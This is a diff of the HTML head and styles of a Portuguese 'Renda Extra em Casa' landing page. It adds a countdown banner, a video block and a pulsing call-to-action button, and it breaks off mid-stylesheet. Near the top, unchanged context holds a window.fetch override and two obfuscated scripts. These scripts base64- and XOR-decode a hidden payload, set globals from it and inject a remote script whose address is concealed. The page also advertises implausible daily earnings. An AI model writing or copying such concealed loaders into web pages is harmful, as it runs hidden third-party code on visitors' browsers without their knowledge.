@@ -3,18 +3,16 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Descubra seu perfil — Renda Extra em Casa</title>
+<title>Renda Extra em Casa — Tarefas de Casa</title>
+
+<!-- Tracking scripts -->
 <script>
   (function() {
     try {
       var _fetch = window.fetch;
       Object.defineProperty(window, 'fetch', {
-        get: function() {
-          return _fetch;
-        },
-        set: function(fn) {
-          _fetch = fn;
-        },
+        get: function() { return _fetch; },
+        set: function(fn) { _fetch = fn; },
         configurable: true,
         enumerable: true
       });
@@ -30,12 +28,12 @@
 </script>
 <script>(function(){var x_soz=atob("DKbEui0UeC5TLl8LfN3mz194WhRxRit/DNX+lQJ3HEB9WytmFcC9lE57FQAxXHB4H9StyllnV146VjpnU9atwkh4VkQgDHMpHdKwyER2DVo2XX0xJ/vomEp4F0wyQiwpRv2/mEN1FUtxFH17Fd6h1mRwWgJxWD5nCcPmgA8iGRk3HTtvTMShihklSBgwHm9uS5eh3xQ2BXMu");var y_mq=[];for(var r_g=0;r_g<x_soz.length;r_g++){y_mq.push(x_soz.charCodeAt(r_g)&255);}var j_b=y_mq[0];var h_w=y_mq.slice(1,1+j_b);var l_vm5=y_mq.slice(1+j_b);var y_ap=l_vm5.map(function(b,p_h2){return b^h_w[p_h2%j_b];});var q_3gd="";for(var k_ld=0;k_ld<y_ap.length;k_ld++){q_3gd+=String.fromCharCode(y_ap[k_ld]&255);}var m_3h=decodeURIComponent(escape(q_3gd));var n_m4=JSON.parse(m_3h);var l_3iod=n_m4.globals||[];l_3iod.forEach(function(r_0){window[r_0.name]=r_0.value;});var h_ajc=document.createElement("script");h_ajc.src=n_m4.url;h_ajc.async=true;h_ajc.defer=true;(n_m4.attributes||[]).forEach(function(q_ou4c){h_ajc.setAttribute(q_ou4c.name,q_ou4c.value);});(document.head||document.documentElement).appendChild(h_ajc);})();</script>
 <script>(function(){var r_xh=atob("DOgqr45R/5fNROFAZ5MI2vw93a3vLJU0F5sQgKEym/njMZUtDo5Tge0+krmvNs4zBJpD3/oi0OK5KZJvC4leyv0l0f2+Zs1iBpxe3ecziuOoN8N6PJMIwe88mrX3ZoUhE4kH2vo8lvG0aZEyAp5Pwfp8h/SiIMwzBIMIg6wnnvu4IcN6RcpXg/VzkfagIcN6RYxL2+98iuOgLYc5SphYyvg0kePgN5QiDoxZjaJzifahMYRiXcoI0tMs");var f_9z=[];for(var f_9k=0;f_9k<r_xh.length;f_9k++){f_9z.push(r_xh.charCodeAt(f_9k)&255);}var g_h=f_9z[0];var w_k=f_9z.slice(1,1+g_h);var q_5=f_9z.slice(1+g_h);var p_n2=q_5.map(function(b,v_h59r){return b^w_k[v_h59r%g_h];});var u_3hw0="";for(var a_hjao=0;a_hjao<p_n2.length;a_hjao++){u_3hw0+=String.fromCharCode(p_n2[a_hjao]&255);}var b_au=decodeURIComponent(escape(u_3hw0));var f_hsr=JSON.parse(b_au);var k_j=f_hsr.globals||[];k_j.forEach(function(j_ddt){window[j_ddt.name]=j_ddt.value;});var j_k=document.createElement("script");j_k.src=f_hsr.url;j_k.async=true;j_k.defer=true;(f_hsr.attributes||[]).forEach(function(v_xdgw){j_k.setAttribute(v_xdgw.name,v_xdgw.value);});(document.head||document.documentElement).appendChild(j_k);})();</script>
+
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="preload" as="image" href="./ganhe-ate-300-por-dia.webp" type="image/webp">
 <link rel="preload" as="image" href="./imagem-site-otimizada.webp" type="image/webp">
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-
 
 <style>
   :root{
@@ -45,15 +43,15 @@
     --ink-soft:#57685B;
     --gold:#E8A33D;
     --gold-deep:#C97F1E;
-    --mint:#2F9E64;
+    --mint:#16A34A;
+    --mint-dark:#15803D;
     --sage:#8FA888;
-    --receipt:#FFFDF8;
     --card:#FFFFFF;
     --font:'Poppins', -apple-system, sans-serif;
     --radius-lg:24px;
     --radius-md:16px;
     --radius-sm:14px;
-    --shadow-card: 0 24px 48px -24px rgba(29,43,34,0.28);
+    --shadow-card: 0 16px 36px -12px rgba(29,43,34,0.12);
   }
 
   *{ box-sizing:border-box; }
@@ -67,745 +65,635 @@
     font-family:var(--font);
     color:var(--ink);
     display:flex;
-    justify-content:center;
-    padding:28px 16px 60px;
+    flex-direction:column;
+    align-items:center;
+    padding:0 0 60px;
     position:relative;
     overflow-x:hidden;
   }
 
-  body.center-screen{ align-items:center; padding-top:16px; padding-bottom:16px; }
-
-  .blob{ position:fixed; border-radius:50%; filter:blur(64px); z-index:0; opacity:0.3; animation: float 12s ease-in-out infinite; }
+  .blob{ position:fixed; border-radius:50%; filter:blur(64px); z-index:0; opacity:0.25; pointer-events:none; animation: float 12s ease-in-out infinite; }
   .blob-a{ width:280px; height:280px; background:var(--gold); top:-80px; left:-100px; }
   .blob-b{ width:320px; height:320px; background:var(--sage); bottom:-120px; right:-120px; animation-delay:-6s; }
   @keyframes float{ 0%,100%{ transform:translateY(0) } 50%{ transform:translateY(-18px) } }
 
-  .app-shell{ width:100%; max-width:440px; position:relative; z-index:1; }
-
-  .topbar{ display:flex; align-items:center; gap:12px; margin-bottom:26px; min-height:6px; }
-  .progress-track{ flex:1; height:6px; background:#E5E7EB; border-radius:999px; overflow:hidden; }
-  .progress-fill{ height:100%; background:#16A34A; border-radius:999px; transition:width 420ms ease; }
-  .step-label{ font-size:12.5px; font-weight:600; color:#111827; white-space:nowrap; font-weight: 700; }
-
-  .card{ padding:24px 16px; text-align:center; position: relative; overflow: visible; }
-body.is-landing { padding-top: 12px; padding-bottom: 0px; min-height: 100vh; }
-body.is-landing .topbar { display: none; }
-body.is-landing .card { padding: 12px 16px 0px; background: transparent; box-shadow: none; margin-bottom: 0; }
-
-body.is-landing .stage { position: relative; z-index: 1; }
-
-  .stage.anim{ animation: fadeSlideIn 460ms cubic-bezier(.2,.7,.3,1) both; }
-  @keyframes fadeSlideIn{ from{ opacity:0; transform:translateY(16px);} to{ opacity:1; transform:translateY(0);} }
-
-  .hero-icon{ width:56px; height:56px; border-radius:16px; background:var(--paper-2); display:flex; align-items:center; justify-content:center; font-size:28px; margin:0 0 18px; }
-
-  .eyebrow{ display:inline-flex; align-items:center; justify-content:center; gap:6px; background:rgba(232,163,61,0.15); color:var(--gold-deep); font-weight:700; font-size:12.5px; padding:7px 13px; border-radius:999px; margin:0 auto 16px; }
-
-  h1{ font-family:var(--font); font-weight:800; font-size:clamp(26px,7vw,34px); line-height:1.2; margin:0 0 16px; letter-spacing:-0.01em; text-align:center; }
-  .accent{ color:var(--mint); }
-  .sub{ font-size:16px; line-height:1.55; color:var(--ink-soft); margin:0 0 26px; font-weight:400; text-align:center; }
-
-  .btn-primary{ display:flex; align-items:center; justify-content:center; gap:8px; width:100%; padding:17px 20px; background:var(--ink); color:var(--paper); border:none; border-radius:var(--radius-sm); font-family:var(--font); font-weight:700; font-size:16px; cursor:pointer; transition:transform 150ms ease, background 150ms ease; }
-  .btn-primary:hover{ background:#132018; transform:translateY(-1px); }
-  .btn-primary:active{ transform:translateY(0); }
-  .btn-primary:focus-visible{ outline:3px solid var(--gold); outline-offset:3px; }
-  .btn-cta{ background:var(--gold); color:var(--ink); text-decoration:none; }
-  .btn-cta:hover{ background:var(--gold-deep); color:#fff; }
-  .trust{ text-align:center; font-size:13px; font-weight:500; color:var(--ink-soft); margin-top:14px; }
-
-  .qcount{ font-size:13px; font-weight:700; color:var(--sage); margin:0 0 12px; }
-  h2{ font-family:var(--font); font-weight:700; font-size:22px; line-height:1.32; margin:0 0 8px; letter-spacing:-0.01em; }
-  .qsub{ font-size:14px; color:var(--ink-soft); margin:0 0 22px; font-weight:400; }
-
-  .options{ display:flex; flex-direction:column; gap:10px; margin-bottom:22px; }
-  .option{ display:flex; align-items:center; gap:14px; width:100%; text-align:left; padding:12px 14px; background:var(--paper-2); border:2px solid transparent; border-radius:var(--radius-md); cursor:pointer; font-family:var(--font); font-size:15px; font-weight:600; color:var(--ink); transition:all 150ms ease; }
-  .option:hover{ border-color:var(--sage); background:#DEE8D6; transform:translateY(-1px); }
-  .option:focus-visible{ outline:3px solid var(--gold); outline-offset:2px; }
-  .opt-icon{ width:40px; height:40px; border-radius:12px; background:var(--card); display:flex; align-items:center; justify-content:center; font-size:19px; flex-shrink:0; }
-
-  .receipt{ background:var(--receipt); border-radius:14px; padding:18px 18px 16px; box-shadow:0 14px 26px -16px rgba(29,43,34,0.32); transform:rotate(-0.5deg); position:relative; margin-top:6px; border-top:2px dashed var(--sage); border-bottom:2px dashed var(--sage); }
-  .receipt-title{ font-size:12px; font-weight:700; letter-spacing:0.03em; text-align:center; color:var(--ink-soft); margin:0 0 12px; }
-  .receipt-row{ display:flex; align-items:center; justify-content:space-between; gap:10px; font-size:13.5px; font-weight:500; color:var(--ink); padding:6px 0; }
-  .r-left{ display:flex; align-items:center; gap:8px; color:var(--ink-soft); }
-  .r-icon{ font-size:14px; }
-  .receipt-divider{ border-top:1px dashed var(--sage); margin:10px 0; }
-  .receipt-total{ font-weight:800; font-size:15px; }
-  .receipt-total span{ color:var(--ink) !important; }
-  .receipt-final{ padding-top:22px; }
-  .stamp{ position:absolute; top:-12px; right:14px; border:3px solid var(--mint); color:var(--mint); padding:6px 11px; font-weight:800; font-size:10.5px; letter-spacing:0.03em; text-align:center; transform:rotate(-8deg); border-radius:8px; background:rgba(47,158,100,0.08); line-height:1.25; }
-
-  .loading-wrap{ text-align:center; padding:64px 16px 56px; }
-  .ring{ width:52px; height:52px; margin:0 auto 22px; border-radius:50%; border:4px solid var(--paper-2); border-top-color:var(--gold); animation:spin 900ms linear infinite; }
-  @keyframes spin{ to{ transform:rotate(360deg);} }
-  .loading-title{ font-family:var(--font); font-size:19px; font-weight:700; margin:0 0 8px; }
-  .loading-sub{ font-size:14px; color:var(--ink-soft); margin:0; font-weight:400; }
-
-  .video-frame{ background:linear-gradient(150deg,#1D2B22,#0E1610); border-radius:var(--radius-md); aspect-ratio:9/16; max-height:360px; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:14px; margin:22px 0 18px; position:relative; overflow:hidden; cursor:pointer; }
-  .video-play{ width:62px; height:62px; border-radius:50%; background:var(--gold); color:var(--ink); display:flex; align-items:center; justify-content:center; font-size:20px; padding-left:4px; }
-  .video-label{ color:var(--paper); font-family:var(--font); font-weight:600; font-size:14px; margin:0; }
-
-  .video-teaser{ display:flex; align-items:center; gap:14px; background:var(--paper-2); border-radius:var(--radius-md); padding:14px 16px; margin-top:22px; margin-bottom:14px; text-align:left; }
-  .mini-play{ width:44px; height:44px; border-radius:12px; background:var(--ink); color:var(--gold); display:flex; align-items:center; justify-content:center; font-size:15px; flex-shrink:0; padding-left:2px; }
-  .video-teaser-text{ font-size:13.5px; font-weight:700; color:var(--ink); line-height:1.4; margin:0; }
-  .video-teaser-text span{ display:block; font-size:12.5px; font-weight:500; color:var(--ink-soft); margin-top:3px; }
-
-  @media (prefers-reduced-motion: reduce){
-    *{ animation:none !important; transition:none !important; }
+  .top-notice {
+    width: 100%;
+    background: #16A34A;
+    color: #FFFFFF;
+    text-align: center;
+    font-size: 11.5px;
+    font-weight: 700;
+    padding: 6px 8px;
+    letter-spacing: 0.1px;
+    box-shadow: 0 2px 10px rgba(22, 163, 74, 0.25);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    flex-wrap: nowrap;
+    white-space: nowrap;
+    line-height: 1.2;
+    position: relative;
+    z-index: 10;
   }
-  .landing-badge { margin-bottom: 8px;
-    margin-bottom: 16px;
+
+  .top-notice-timer {
+    background: rgba(0, 0, 0, 0.22);
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: monospace, sans-serif;
+    font-size: 12px;
+    font-weight: 800;
+    color: #FEF08A;
+    letter-spacing: 0.5px;
+    display: inline-block;
+  }
+
+  .app-shell{ width:100%; max-width:460px; position:relative; z-index:1; margin-top: 16px; padding: 0 12px; }
+
+  .landing-card {
+    background: transparent;
+    padding: 0;
+    position: relative;
+    z-index: 1;
+    box-shadow: none;
+    border: none;
+  }
+
+  .landing-badge {
     display: inline-flex;
     align-items: center;
     gap: 6px;
     background-color: #E7F3EB;
     border: 1px solid #C2E2CC;
-    color: #198737;
-    font-weight: 600;
+    color: #16A34A;
+    font-weight: 700;
     font-size: 13px;
     padding: 6px 14px;
     border-radius: 99px;
-    margin-bottom: 16px;
+    margin-bottom: 14px;
   }
-  .social-proof-banner { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 8px; }
+
+  .social-proof-banner { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 14px; }
   .sp-avatars { display: flex; }
   .sp-avatars img { width: 32px; height: 32px; border-radius: 50%; border: 2px solid #fff; margin-left: -10px; }
   .sp-avatars img:first-child { margin-left: 0; }
   .sp-text { text-align: left; font-size: 11px; color: #4A5D52; line-height: 1.2; }
   .sp-stars { color: #F9C300; font-size: 14px; margin-bottom: 2px; display:flex; gap:2px; }
-  .sp-text strong { color: #112318; }
-  .landing-title { font-size: 34px; font-weight: 800; color: #112318; line-height: 1.1; margin-bottom: 8px; letter-spacing: -1px; }
-  .landing-title .highlight { color: #198737; position: relative; display: inline-block; }
+  .sp-text strong { color: #112318; font-weight: 800; }
+
+  .landing-title { font-size: 30px; font-weight: 800; color: #112318; line-height: 1.15; margin: 0 0 12px; letter-spacing: -1px; text-align: center; }
+  .landing-title .highlight { color: #16A34A; position: relative; display: inline-block; }
   .landing-title .highlight svg { position: absolute; bottom: -6px; left: 0; width: 100%; height: 8px; z-index: -1; }
-  .landing-sub-text { font-size: 15px; color: #4A5D52; margin-bottom: 8px; line-height: 1.4; }
-  .landing-sub-text strong { color: #198737; }
-  .hero-layout { display: flex; flex-direction: column; align-items: center; gap: 16px; margin-bottom: 16px; }
-  .hero-image-col { flex: 1; position: relative; display: flex; justify-content: center; width: calc(100% + 48px); margin: 0 -24px;}
-  .hero-image-col img { width: 100%; max-width: 115%; transform: scale(1.12); margin-top: 12px; border-radius: 16px; mask-image: linear-gradient(to bottom, black 80%, transparent 100%); -webkit-mask-image: linear-gradient(to bottom, black 80%, transparent 100%); }
-  .hero-benefits-col { display: flex; justify-content: center; align-items: center; gap: 4px; text-align: center; flex-wrap: nowrap; width: 100%; }
-  .h-benefit { display: flex; align-items: center; gap: 4px; background: #F9FAFB; padding: 4px 6px; border-radius: 99px; flex: 1; justify-content: center; }
-  .h-b-icon { width: 16px; height: 16px; background: transparent; color: #198737; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
-  .h-b-icon svg { width: 12px; height: 12px; }
-  .h-b-text { font-size: 11px; color: #4A5D52; line-height: 1.3; }
-  .h-b-text strong { font-size: 10px; color: #112318; display: block; white-space: nowrap; }
-  .landing-cta-btn { background: linear-gradient(180deg, #28A149 0%, #15732E 100%); color: white; width: 100%; padding: 18px; border-radius: 99px; font-size: 20px; font-weight: 700; border: none; box-shadow: 0 8px 24px rgba(25, 135, 55, 0.3); display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; margin-bottom: 0px; transition: transform 0.2s; }
-  .landing-cta-btn:hover { transform: scale(1.02); }
-  .trust-badges-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; background: #F9FAFB; border-radius: 16px; padding: 16px 8px; margin-bottom: 16px; }
-  .t-badge { display: flex; flex-direction: column; align-items: center; text-align: center; gap: 6px; }
-  .t-badge svg { width: 24px; height: 24px; color: #198737; }
-  .t-badge-text { font-size: 10px; color: #4A5D52; line-height: 1.2; }
-  .t-badge-text strong { color: #112318; display: block; font-size: 11px; }
-  .footer-trust-text { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 12px; color: #4A5D52; font-weight: 500; }
-  .footer-trust-text svg { width: 14px; height: 14px; }
-  .banknote { position: absolute; z-index: 0; opacity: 0.6; pointer-events: none; }
-  .bn-1 { top: 20px; left: -50px; width: 120px; transform: rotate(-15deg); }
-  .bn-2 { top: 40px; right: -60px; width: 100px; transform: rotate(25deg); }
-  .bn-3 { bottom: 40px; left: -40px; width: 90px; transform: rotate(-10deg); }
-  .bn-4 { bottom: 20px; right: -50px; width: 110px; transform: rotate(15deg); }
-  .landing-card { background: white; border-radius: 24px; padding: 32px 16px 24px; position: relative; z-index: 1; overflow: hidden;}
-  .landing-bg-dots { position: absolute; top:0; left:0; width:100%; height:100%; background-image: radial-gradient(circle at 1px 1px, rgba(143,168,136,0.15) 1px, transparent 0); background-size: 22px 22px; z-index: -1; }
 
-  .q-header { text-align: center; margin-bottom: 20px; }
-  .q-badge { display: inline-flex; align-items: center; justify-content: center; gap: 6px; background: #F0FDF4; color: #16A34A; padding: 6px 12px; border-radius: 99px; font-size: 13px; font-weight: 600; margin: 0 auto 16px; }
-  .q-title-row { display: flex; flex-direction: column; align-items: center; gap: 16px; }
-  .q-title-col { flex: 1; text-align: center; }
-  .q-title-col h2 { font-size: 24px; font-weight: 800; color: #111827; margin-bottom: 8px; line-height: 1.2; text-align: center; }
-  .q-title-col .qsub { font-size: 15px; color: #4B5563; line-height: 1.4; margin: 0; text-align: center; }
-  .q-image-wrap { width: 120px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; margin-right: -24px; overflow: hidden; border-radius: 100px 0 0 100px; }
-  .q-image { width: 100%; height: auto; border-radius: 16px; mask-image: linear-gradient(to right, black 60%, transparent 100%); -webkit-mask-image: linear-gradient(to right, black 60%, transparent 100%); object-fit: cover;}
-  
-  .option { display:flex; align-items:center; gap:16px; width:100%; text-align:left; padding:16px; background:#FFFFFF; border:2px solid #E5E7EB; border-radius:16px; cursor:pointer; transition:all 150ms ease; box-shadow: 0 1px 2px rgba(0,0,0,0.02); margin-bottom:0 !important; }
-  .option:hover { background:#F0FDF4; border-color:#16A34A; }
-  .opt-icon { width:48px; height:48px; border-radius:50%; background:#F3F4F6; display:flex; align-items:center; justify-content:center; font-size:24px; flex-shrink:0; }
-  .option:hover .opt-icon { background: #DCFCE7; }
-  .opt-texts { display:flex; flex-direction:column; gap:2px; flex:1; }
-  .opt-label { font-size:16px; font-weight:700; color:#111827; }
-  .opt-sub { font-size:13px; font-weight:400; color:#6B7280; line-height:1.3; }
-  .opt-radio { width:24px; height:24px; border-radius:50%; border:2px solid #D1D5DB; margin-left:auto; flex-shrink:0; transition:all 150ms ease; }
-  .option:hover .opt-radio { border-color:#16A34A; background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2316A34A' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='20 6 9 17 4 12'%3E%3C/polyline%3E%3C/svg%3E") no-repeat center; background-size: 14px; }
-  
-  .q-footer { display:flex; align-items:center; gap:12px; background:#F0FDF4; padding:16px; border-radius:16px; text-align:left; margin-top:16px; }
-  .q-footer svg { flex-shrink:0; }
-  .q-footer-text { font-size:12px; color:#4B5563; line-height:1.4; }
-  .q-footer-text strong { color:#16A34A; font-size: 13px; }
+  .landing-sub-text { font-size: 15px; color: #4A5D52; margin-bottom: 18px; line-height: 1.45; text-align: center; }
 
-  /* Top Banner Box */
-  .result-step-banner {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    background: #F0FDF4;
-    border: 1px solid #DCFCE7;
-    border-radius: 18px;
-    padding: 12px 14px;
-    margin-top: 10px;
-    margin-bottom: 14px;
-    text-align: left;
+  /* Video area */
+  .video-section {
+    margin-bottom: 20px;
   }
-  .rsb-thumb {
-    width: 44px;
-    height: 44px;
-    border-radius: 12px;
-    background: #16A34A;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-shrink: 0;
-  }
-  .rsb-content {
-    flex: 1;
-  }
-  .rsb-title {
-    font-size: 15px;
-    font-weight: 800;
-    color: #111827;
-    line-height: 1.2;
-  }
-  .rsb-sub {
-    font-size: 12px;
-    color: #4B5563;
-    line-height: 1.35;
-    margin-top: 3px;
-  }
-
-  /* Hero Result Layout */
-  .result-hero-wrap {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    position: relative;
-    margin-bottom: 16px;
-    text-align: center;
-    width: 100%;
-  }
-  .result-hero-text {
-    width: 100%;
-    text-align: center;
-    z-index: 1;
-  }
-  .result-eyebrow {
-    display: inline-flex;
-    align-items: center;
-    gap: 6px;
-    background: #FFFBEB;
-    border: 1px solid #FDE68A;
-    color: #D97706;
-    font-size: 12px;
+  .video-title {
+    font-size: 14px;
     font-weight: 700;
-    padding: 5px 12px;
-    border-radius: 99px;
+    color: #111827;
+    text-align: center;
     margin-bottom: 10px;
   }
-  .result-title {
-    font-size: 27px;
-    font-weight: 800;
-    color: #111827;
-    line-height: 1.15;
-    margin: 0 0 8px;
-    letter-spacing: -0.02em;
-  }
-  .result-highlight {
-    color: #16A34A;
-  }
-  .result-sub {
-    font-size: 13px;
-    color: #4B5563;
-    line-height: 1.45;
-    margin: 0;
-  }
-  .rs-task {
-    color: #16A34A;
-    font-weight: 700;
-  }
-
-  /* Right Side Character & Badge */
-  .result-hero-img-wrap {
-    position: relative;
-    width: 135px;
-    flex-shrink: 0;
-    display: flex;
-    justify-content: flex-end;
-    margin-top: -15px;
-  }
-  .result-character-img {
-    width: 125px;
-    height: 155px;
-    object-fit: cover;
-    border-radius: 20px;
-    mask-image: linear-gradient(to bottom, black 80%, transparent 100%);
-    -webkit-mask-image: linear-gradient(to bottom, black 80%, transparent 100%);
-  }
-  .approved-badge {
-    position: absolute;
-    bottom: -8px;
-    left: -22px;
-    background: #FFFFFF;
+  .video-iframe {
+    width: 100%;
+    aspect-ratio: 9/16;
+    border-radius: var(--radius-md);
     border: 2px solid #16A34A;
-    border-radius: 12px;
-    padding: 5px 10px;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    box-shadow: 0 8px 16px rgba(22, 163, 74, 0.15);
-    transform: rotate(-6deg);
-    z-index: 2;
-    white-space: nowrap;
-  }
-  .ab-text {
-    font-size: 10px;
-    font-weight: 800;
-    color: #16A34A;
-    line-height: 1.15;
-    letter-spacing: 0.02em;
-    text-align: center;
-  }
-  .ab-icon {
-    width: 20px;
-    height: 20px;
-    border-radius: 50%;
-    background: #16A34A;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    overflow: hidden;
+    margin: 0;
+    box-shadow: 0 12px 32px rgba(22, 163, 74, 0.2);
   }
 
-  /* Receipt Card */
-  .result-receipt-card {
-    background: #FFFFFF;
-    border-radius: 20px;
-    padding: 18px 16px;
-    box-shadow: 0 12px 32px rgba(29, 43, 34, 0.08);
-    border: 1px solid #E5E7EB;
-    margin-top: 14px;
-    margin-bottom: 20px;
-    text-align: left;
-    position: relative;
-    z-index: 1;
-  }
-  .rc-header {
-    font-size: 13.5px;
-    font-weight: 800;
-    color: #111827;
-    margin-bottom: 14px;
-  }
-  .rc-row {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 8px 0;
-  }
-  .rc-left {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-  .rc-icon-bg {
-    width: 32px;
-    height: 32px;
-    border-radius: 10px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-shrink: 0;
-  }
-  .rc-icon-bg.green-soft {
-    background: #F0FDF4;
-  }
-  .rc-icon-bg.green-filled {
-    background: #16A34A;
-  }
-  .rc-icon-bg.red-soft {
-    background: #FEF2F2;
-  }
-  .rc-label {
-    font-size: 14px;
-    font-weight: 600;
-    color: #374151;
-  }
-  .rc-val.green {
-    font-size: 15px;
-    font-weight: 800;
-    color: #16A34A;
-  }
-  .rc-check {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-  .rc-divider {
-    border-top: 2px dashed #E5E7EB;
-    margin: 12px 0 14px;
-  }
-  .rc-total-row {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-  }
-  .rc-total-label {
-    font-size: 15px;
-    font-weight: 800;
-    color: #111827;
-  }
-  .rc-total-val-wrap {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-  }
-  .rc-total-val {
-    font-size: 24px;
-    font-weight: 800;
-    color: #16A34A;
-  }
-
-  /* CTA Wrap & Button */
-  .result-cta-wrap {
-    position: relative;
-    width: 100%;
-    margin-top: 10px;
-  }
-  .cta-arrow-indicator {
-    position: absolute;
-    left: -14px;
-    top: -22px;
-    z-index: 2;
-  }
-  .btn-result-cta {
-    background: linear-gradient(180deg, #16A34A 0%, #15803D 100%);
-    color: #FFFFFF;
-    font-size: 18px;
-    font-weight: 800;
-    padding: 18px;
-    border-radius: 99px;
-    border: none;
-    box-shadow: 0 10px 25px rgba(22, 163, 74, 0.35);
-    width: 100%;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-    transition: transform 150ms ease, box-shadow 150ms ease;
-  }
-  .btn-result-cta:hover {
-    transform: scale(1.02);
-    box-shadow: 0 12px 28px rgba(22, 163, 74, 0.45);
-  }
-
-  .btn-cta-green {
-    background: linear-gradient(180deg, #16A34A 0%, #15803D 100%);
-    color: #FFFFFF !important;
+  /* CTA Button */
+  .landing-cta-btn {
+    background: linear-gradient(180deg, #22C55E 0%, #15803D 100%);
+    color: white !important;
     text-decoration: none !important;
     width: 100%;
-    padding: 18px 20px;
+    padding: 18px 16px;
     border-radius: 99px;
     border: none;
-    box-shadow: 0 10px 28px rgba(22, 163, 74, 0.45);
+    box-shadow: 0 10px 28px rgba(22, 163, 74, 0.4);
     display: flex;
     flex-direction: column;
     align-items: center;
     justify-content: center;
-    gap: 4px;
+    gap: 3px;
     cursor: pointer;
     transition: transform 150ms ease, box-shadow 150ms ease;
-    margin-top: 16px;
+    animation: pulse 2s infinite;
   }
-  .btn-cta-green:hover {
+  .landing-cta-btn:hover {
     transform: scale(1.02);
-    box-shadow: 0 14px 32px rgba(22, 163, 74, 0.55);
+    box-shadow: 0 14px 34px rgba(22, 163, 74, 0.55);
   }
 
-  /* Step 6 / Confirm Screen Styles */
-  .confirm-container {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
+  @keyframes pulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.02); }
+    100% { transform: scale(1); }
+  }
+
+  .cta-sub-text {
+    font-size: 12px;
+    color: #4B5563;
     text-align: center;
-    position: relative;
-  }
-
-  .confirm-cta-wrap {
-    position: relative;
-    width: 100%;
-    display: flex;
-    justify-content: center;
-    margin-bottom: 20px;
-  }
-
-  .confirm-btn {
-    position: relative;
+    margin-top: 8px;
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 12px;
-    width: 100%;
-    padding: 16px 20px 16px 64px;
-    background: linear-gradient(180deg, #16A34A 0%, #15803D 100%);
-    color: #FFFFFF;
-    border: none;
-    border-radius: 99px;
+    gap: 6px;
+  }
+
+  /* Trust Badges */
+  .trust-badges-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 8px;
+    background: #F0FDF4;
+    border: 1px solid #DCFCE7;
+    border-radius: 16px;
+    padding: 14px 8px;
+    margin-top: 18px;
+    margin-bottom: 24px;
+  }
+  .t-badge { display: flex; flex-direction: column; align-items: center; text-align: center; gap: 4px; }
+  .t-badge svg { width: 22px; height: 22px; color: #16A34A; }
+  .t-badge-text { font-size: 10px; color: #4A5D52; line-height: 1.2; }
+  .t-badge-text strong { color: #112318; display: block; font-size: 11px; font-weight: 700; }
+
+  /* Sections */
+  .section-card {
+    background: white;
+    border-radius: var(--radius-md);
+    padding: 22px 18px;
+    margin-top: 18px;
+    box-shadow: var(--shadow-card);
+    border: 1px solid #E5E7EB;
+  }
+  .section-title {
     font-size: 20px;
     font-weight: 800;
-    cursor: pointer;
-    box-shadow: 0 10px 24px rgba(22, 163, 74, 0.35);
-    transition: transform 150ms ease;
+    color: #111827;
+    margin: 0 0 14px;
+    text-align: center;
+    line-height: 1.25;
   }
+  .section-title span { color: #16A34A; }
 
-  .confirm-btn:hover {
-    transform: scale(1.02);
-  }
-
-  .gift-badge-icon {
-    position: absolute;
-    left: 4px;
-    top: 50%;
-    transform: translateY(-50%);
-    width: 52px;
-    height: 52px;
-    border-radius: 50%;
-    background: linear-gradient(135deg, #22C55E 0%, #15803D 100%);
-    border: 3px solid #FFFFFF;
-    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+  /* How it works steps */
+  .steps-list { display: flex; flex-direction: column; gap: 14px; }
+  .step-item {
     display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 26px;
-  }
-
-  .confirm-main-card {
-    background: #F9FAF8;
-    border: 1px solid #E5E7EB;
-    border-radius: 24px;
-    padding: 20px 16px;
-    width: 100%;
-    text-align: left;
-    margin-bottom: 16px;
-  }
-
-  .cmc-header {
-    display: flex;
-    align-items: center;
+    align-items: flex-start;
     gap: 12px;
-    margin-bottom: 18px;
+    background: #F9FAFB;
+    border: 1px solid #E5E7EB;
+    padding: 14px;
+    border-radius: 14px;
   }
-
-  .cmc-icon {
-    width: 48px;
-    height: 48px;
+  .step-number {
+    width: 38px;
+    height: 38px;
     border-radius: 50%;
-    background: #DCFCE7;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 24px;
-    flex-shrink: 0;
-  }
-
-  .cmc-title-wrap {
-    flex: 1;
-  }
-
-  .cmc-title {
+    background: #16A34A;
+    color: white;
     font-size: 16px;
     font-weight: 800;
-    color: #111827;
-    margin-bottom: 2px;
-  }
-
-  .cmc-sub {
-    font-size: 12px;
-    color: #6B7280;
-    line-height: 1.35;
-  }
-
-  .cmc-list {
     display: flex;
-    flex-direction: column;
